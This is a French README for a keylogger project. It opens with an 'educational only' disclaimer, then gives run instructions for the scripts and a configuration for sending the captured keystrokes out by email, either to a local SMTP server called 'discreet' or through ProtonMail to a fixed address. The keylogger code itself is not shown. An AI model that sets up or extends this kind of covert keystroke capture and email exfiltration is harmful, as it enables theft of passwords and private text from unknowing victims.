# Disclaimer
    Tout ce dossier est à but éducatif. Le fait de concevoir un keylogger et fait pour savoir comment s'en protéger. Il sert également de démonstration à des jeunes apprenants. Merci de ne pas utiliser ses script à des fins malveillantes. Y'a assé de fdp dans ce monde. 

## Version fonctionnel
    - key.py = kl local fonctionnel -lancer avec python3 minimum et avec environnement virtuel venv
    (  & E:\2023\OTTO\.venv\Scripts\python.exe e:/2023/OTTO/kl/klm.py  )
    - klm.py = local non fonctionnel / smtp à installer / start uniquement via venv
    (start_klm.bat)

POUR CONFIGURER L'ENVOI EMAIL :
Option A : SMTP Local (recommandé - discret)

    Ouvre un terminal ADMIN

    Lance un serveur SMTP local :

cmd

python -m smtpd -n -c DebuggingServer localhost:1025

    Laisse cette fenêtre ouverte (elle recevra les emails)

Option B : ProtonMail direct

Modifie la configuration :
python

CONFIG = {
    'EMAIL_TO': 'securite-perso@proton.me',
    'EMAIL_FROM': 'ton_email@proton.me',
    'SMTP_SERVER': '127.0.0.1',  # Change en 'smtp.protonmail.ch'
    'SMTP_PORT': 587,  # Port ProtonMail
    'USE_TLS': True,
    # Ajoute si besoin:
    # 'EMAIL_USER': 'ton_email@proton.me',
    # 'EMAIL_PASSWORD': 'ton_mot_de_passe',
}